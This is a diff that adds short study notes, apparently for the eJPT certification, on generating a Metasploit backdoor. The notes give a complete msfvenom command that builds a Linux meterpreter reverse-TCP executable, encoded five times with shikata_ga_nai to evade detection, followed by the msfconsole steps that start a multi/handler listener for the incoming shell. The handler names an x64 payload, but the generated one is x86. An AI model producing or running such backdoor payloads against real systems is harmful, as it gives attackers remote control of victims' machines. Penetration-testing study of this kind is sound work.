@@ -1,0 +1,40 @@
+[eJPT][metasploit][msfvenom][meterpreter]msfvenom -- the backdoor function of Metasploit
+#Reference: https://nitesculucian.github.io/2018/07/24/msfvenom-cheat-sheet/
+
+
+*****Generate the server side:*****
+# msfvenom -l encoders
+...
+x86/shikata_ga_nai
+...
+
+# msfvenom -l payloads
+...
+linux/x86/meterpreter_reverse_tcp
+...
+
+# msfvenom -l formats
+...
+elf
+elf-so
+exe
+...
+
+# msfvenom -p linux/x86/meterpreter_reverse_tcp lhost=xxx.xxx.xxx.xxx lport=xxxxx -e x86/shikata_ga_nai -i 5 -f elf -o ./test.out
+
+
+*****The client side:*****
+# /etc/init.d/postgresql start
+
+# msfconsole
+msf5> use exploit/multi/handler
+
+msf5> search type:payload platform:linux
+
+msf5> set payload payload/linux/x64/meterpreter_reverse_tcp
+
+msf5> set LHOST xxx.xxx.xxx.xxx
+
+msf5> exploit -j
+
+msf5> sessions -l
